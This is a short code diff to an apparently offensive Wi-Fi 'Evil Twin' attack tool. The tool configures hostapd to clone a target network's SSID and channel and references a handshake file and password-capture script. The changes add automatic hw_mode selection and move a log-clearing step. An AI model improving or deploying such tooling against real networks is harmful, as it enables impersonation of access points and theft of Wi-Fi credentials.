@@ -381,6 +381,14 @@ class EvilTwinAttack:
             self.run_command(f"sed -i 's/handshake_file = .*/handshake_file = \"{self.config.handshake_file}\"/' passapi.py")
         
         if Path("hostapd.conf").exists():
+        
+            # Auto-detect hw_mode based on channel
+            channel_num = int(self.config.target_channel)
+            if channel_num > 14:
+                hw_mode = "a"
+            else:
+                hw_mode = "g"
+            self.run_command(f"sed -i 's/^hw_mode=.*/hw_mode={hw_mode}/' hostapd.conf")
             self.run_command(f"sed -i 's/^ssid=.*/ssid={self.config.target_ssid}/' hostapd.conf")
             self.run_command(f"sed -i 's/^channel=.*/channel={self.config.target_channel}/' hostapd.conf")
             self.run_command(f"sed -i 's/^interface=.*/interface={self.config.ap_interface}/' hostapd.conf")
@@ -542,9 +550,6 @@ class EvilTwinAttack:
         log_success("Cleanup complete")
     
     def run(self):
-        # Clear old log file for fresh start
-        with open("/sdcard/evil_twin_debug.log", "w") as f:
-            f.truncate(0)
         
         parser = argparse.ArgumentParser(description='Evil Twin Attack Tool')
         parser.add_argument('--interface', required=True, help='Monitor interface (already in monitor mode)')
@@ -556,6 +561,7 @@ class EvilTwinAttack:
         parser.add_argument('--internet', required=True, help='Internet source (wlan0, auto, or custom interface name)')
         
         args = parser.parse_args()
+        
         
         # Clear old log file for fresh start
         with open("/sdcard/evil_twin_debug.log", "w") as f:
